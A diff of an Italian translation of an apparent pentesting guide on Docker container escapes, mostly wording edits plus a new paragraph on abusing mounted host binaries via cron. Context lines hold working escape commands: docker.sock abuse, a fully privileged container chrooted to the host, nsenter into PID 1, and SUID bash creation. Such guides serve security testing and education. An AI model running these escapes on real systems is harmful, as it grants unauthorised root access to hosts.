@@ -19,7 +19,7 @@ Questo di solito accade nei container docker che per qualche motivo devono conne
 find / -name docker.sock 2>/dev/null
 #It's usually in /run/docker.sock
 ```
-In questo caso puoi utilizzare i comandi docker regolari per comunicare con il demone docker:
+In questo caso puoi utilizzare comandi docker regolari per comunicare con il demone docker:
 ```bash
 #List images to use one
 docker images
@@ -33,12 +33,12 @@ nsenter --target 1 --mount --uts --ipc --net --pid -- bash
 # Get full privs in container without --privileged
 docker run -it -v /:/host/ --cap-add=ALL --security-opt apparmor=unconfined --security-opt seccomp=unconfined --security-opt label:disable --pid=host --userns=host --uts=host --cgroupns=host ubuntu chroot /host/ bash
 ```
-> [!NOTE]
+> [!TIP]
 > Nel caso in cui il **docker socket si trovi in un luogo inaspettato**, puoi comunque comunicare con esso utilizzando il comando **`docker`** con il parametro **`-H unix:///path/to/docker.sock`**
 
 Il daemon Docker potrebbe anche [ascoltare su una porta (di default 2375, 2376)](../../../../network-services-pentesting/2375-pentesting-docker.md) o su sistemi basati su Systemd, la comunicazione con il daemon Docker può avvenire tramite il socket Systemd `fd://`.
 
-> [!NOTE]
+> [!TIP]
 > Inoltre, presta attenzione ai socket di runtime di altri runtime di alto livello:
 >
 > - dockershim: `unix:///var/run/dockershim.sock`
@@ -134,7 +134,7 @@ mount: /mnt: permission denied. ---> Failed! but if not, you may have access to 
 ### debugfs (Interactive File System Debugger)
 debugfs /dev/sda1
 ```
-#### Privileged Escape Abusare dell'esistente release_agent ([cve-2022-0492](https://unit42.paloaltonetworks.com/cve-2022-0492-cgroups/)) - PoC1
+#### Privileged Escape Abusando dell'esistente release_agent ([cve-2022-0492](https://unit42.paloaltonetworks.com/cve-2022-0492-cgroups/)) - PoC1
 ```bash:Initial PoC
 # spawn a new container to exploit via:
 # docker run --rm -it --privileged ubuntu bash
@@ -216,9 +216,9 @@ Trova una **spiegazione della tecnica** in:
 docker-release_agent-cgroups-escape.md
 {{#endref}}
 
-#### Privileged Escape Abusing release_agent senza conoscere il percorso relativo - PoC3
+#### Privileged Escape Abusando release_agent senza conoscere il percorso relativo - PoC3
 
-Negli exploit precedenti, il **percorso assoluto del container all'interno del filesystem dell'host è rivelato**. Tuttavia, questo non è sempre il caso. Nei casi in cui **non conosci il percorso assoluto del container all'interno dell'host**, puoi utilizzare questa tecnica:
+Negli exploit precedenti, **il percorso assoluto del contenitore all'interno del filesystem dell'host è rivelato**. Tuttavia, questo non è sempre il caso. Nei casi in cui **non conosci il percorso assoluto del contenitore all'interno dell'host**, puoi utilizzare questa tecnica:
 
 {{#ref}}
 release_agent-exploit-relative-paths-to-pids.md
@@ -333,9 +333,11 @@ In diverse occasioni scoprirai che il **container ha qualche volume montato dall
 ```bash
 docker run --rm -it -v /:/host ubuntu bash
 ```
-### Privilege Escalation con 2 shell e mount dell'host
+Un altro esempio interessante può essere trovato in [**questo blog**](https://projectdiscovery.io/blog/versa-concerto-authentication-bypass-rce) dove è indicato che le cartelle `/usr/bin/` e `/bin/` dell'host sono montate all'interno del container, consentendo all'utente root del container di modificare i binari all'interno di queste cartelle. Pertanto, se un cron job utilizza un binario da lì, come `/etc/cron.d/popularity-contest`, questo consente di uscire dal container modificando un binario utilizzato dal cron job.
 
-Se hai accesso come **root all'interno di un container** che ha una cartella dell'host montata e hai **escapato come utente non privilegiato nell'host** e hai accesso in lettura sulla cartella montata.\
+### Escalation dei privilegi con 2 shell e montaggio dell'host
+
+Se hai accesso come **root all'interno di un container** che ha alcune cartelle dell'host montate e hai **escapato come utente non privilegiato all'host** e hai accesso in lettura sulla cartella montata.\
 Puoi creare un **file bash suid** nella **cartella montata** all'interno del **container** e **eseguirlo dall'host** per privesc.
 ```bash
 cp /bin/bash . #From non priv inside mounted folder
@@ -344,14 +346,14 @@ chown root:root bash #From container as root inside mounted folder
 chmod 4777 bash #From container as root inside mounted folder
 bash -p #From non priv inside mounted folder
 ```
-### Privilege Escalation con 2 shell
+### Privilege Escalation with 2 shells
 
 Se hai accesso come **root all'interno di un container** e sei **uscito come utente non privilegiato nell'host**, puoi abusare di entrambe le shell per **privesc all'interno dell'host** se hai la capacità MKNOD all'interno del container (è di default) come [**spiegato in questo post**](https://labs.withsecure.com/blog/abusing-the-access-to-mount-namespaces-through-procpidroot/).\
 Con tale capacità, l'utente root all'interno del container è autorizzato a **creare file di dispositivo a blocchi**. I file di dispositivo sono file speciali utilizzati per **accedere all'hardware sottostante e ai moduli del kernel**. Ad esempio, il file di dispositivo a blocchi /dev/sda consente di **leggere i dati grezzi sul disco del sistema**.
 
 Docker protegge contro l'uso improprio dei dispositivi a blocchi all'interno dei container imponendo una politica cgroup che **blocca le operazioni di lettura/scrittura sui dispositivi a blocchi**. Tuttavia, se un dispositivo a blocchi viene **creato all'interno del container**, diventa accessibile dall'esterno del container tramite la directory **/proc/PID/root/**. Questo accesso richiede che **il proprietario del processo sia lo stesso** sia all'interno che all'esterno del container.
 
-Esempio di **sfruttamento** da questo [**writeup**](https://radboudinstituteof.pwning.nl/posts/htbunictfquals2021/goodgames/):
+**Esempio di sfruttamento** da questo [**writeup**](https://radboudinstituteof.pwning.nl/posts/htbunictfquals2021/goodgames/):
 ```bash
 # On the container as root
 cd /
@@ -417,13 +419,13 @@ cat /proc/635813/fd/4
 Puoi anche **terminare processi e causare un DoS**.
 
 > [!WARNING]
-> Se in qualche modo hai **accesso privilegiato su un processo al di fuori del container**, potresti eseguire qualcosa come `nsenter --target <pid> --all` o `nsenter --target <pid> --mount --net --pid --cgroup` per **eseguire una shell con le stesse restrizioni ns** (si spera nessuna) **di quel processo.**
+> Se in qualche modo hai **accesso privilegiato a un processo al di fuori del container**, potresti eseguire qualcosa come `nsenter --target <pid> --all` o `nsenter --target <pid> --mount --net --pid --cgroup` per **eseguire una shell con le stesse restrizioni ns** (si spera nessuna) **di quel processo.**
 
 ### hostNetwork
 ```
 docker run --rm -it --network=host ubuntu bash
 ```
-Se un container è stato configurato con il Docker [host networking driver (`--network=host`)](https://docs.docker.com/network/host/), lo stack di rete di quel container non è isolato dal host Docker (il container condivide lo spazio dei nomi di rete dell'host) e il container non riceve un proprio indirizzo IP. In altre parole, il **container lega tutti i servizi direttamente all'IP dell'host**. Inoltre, il container può **intercettare TUTTO il traffico di rete che l'host** sta inviando e ricevendo sull'interfaccia condivisa `tcpdump -i eth0`.
+Se un contenitore è stato configurato con il Docker [host networking driver (`--network=host`)](https://docs.docker.com/network/host/), lo stack di rete di quel contenitore non è isolato dal host Docker (il contenitore condivide lo spazio dei nomi di rete dell'host) e il contenitore non riceve un proprio indirizzo IP allocato. In altre parole, il **contenitore lega tutti i servizi direttamente all'IP dell'host**. Inoltre, il contenitore può **intercettare TUTTO il traffico di rete che l'host** sta inviando e ricevendo sull'interfaccia condivisa `tcpdump -i eth0`.
 
 Ad esempio, puoi usare questo per **sniffare e persino spoofare il traffico** tra l'host e l'istanza di metadata.
 
@@ -432,7 +434,7 @@ Come nei seguenti esempi:
 - [Writeup: How to contact Google SRE: Dropping a shell in cloud SQL](https://offensi.com/2020/08/18/how-to-contact-google-sre-dropping-a-shell-in-cloud-sql/)
 - [Metadata service MITM allows root privilege escalation (EKS / GKE)](https://blog.champtar.fr/Metadata_MITM_root_EKS_GKE/)
 
-Sarai anche in grado di accedere ai **servizi di rete legati a localhost** all'interno dell'host o persino accedere alle **permissive di metadata del nodo** (che potrebbero essere diverse da quelle a cui un container può accedere).
+Sarai anche in grado di accedere ai **servizi di rete legati a localhost** all'interno dell'host o persino accedere alle **permissive di metadata del nodo** (che potrebbero essere diverse da quelle a cui un contenitore può accedere).
 
 ### hostIPC
 ```bash
@@ -470,17 +472,17 @@ Questo attiverà il payload presente nel file main.go.
 
 Per ulteriori informazioni: [https://blog.dragonsector.pl/2019/02/cve-2019-5736-escape-from-docker-and.html](https://blog.dragonsector.pl/2019/02/cve-2019-5736-escape-from-docker-and.html)
 
-> [!NOTE]
+> [!TIP]
 > Ci sono altre CVE a cui il container può essere vulnerabile, puoi trovare un elenco in [https://0xn3va.gitbook.io/cheat-sheets/container/escaping/cve-list](https://0xn3va.gitbook.io/cheat-sheets/container/escaping/cve-list)
 
-## Docker Custom Escape
+## Escape Personalizzato di Docker
 
-### Superficie di fuga Docker
+### Superficie di Escape di Docker
 
 - **Namespaces:** Il processo dovrebbe essere **completamente separato da altri processi** tramite namespaces, quindi non possiamo fuggire interagendo con altri procs a causa dei namespaces (per impostazione predefinita non possono comunicare tramite IPC, socket unix, servizi di rete, D-Bus, `/proc` di altri procs).
 - **Utente root**: Per impostazione predefinita, l'utente che esegue il processo è l'utente root (tuttavia i suoi privilegi sono limitati).
 - **Capabilities**: Docker lascia le seguenti capabilities: `cap_chown,cap_dac_override,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_chroot,cap_mknod,cap_audit_write,cap_setfcap=ep`
-- **Syscalls**: Questi sono i syscalls che l'**utente root non sarà in grado di chiamare** (a causa della mancanza di capabilities + Seccomp). Gli altri syscalls potrebbero essere utilizzati per cercare di fuggire.
+- **Syscalls**: Queste sono le syscalls che l'**utente root non sarà in grado di chiamare** (a causa della mancanza di capabilities + Seccomp). Le altre syscalls potrebbero essere utilizzate per cercare di fuggire.
 
 {{#tabs}}
 {{#tab name="x64 syscalls"}}
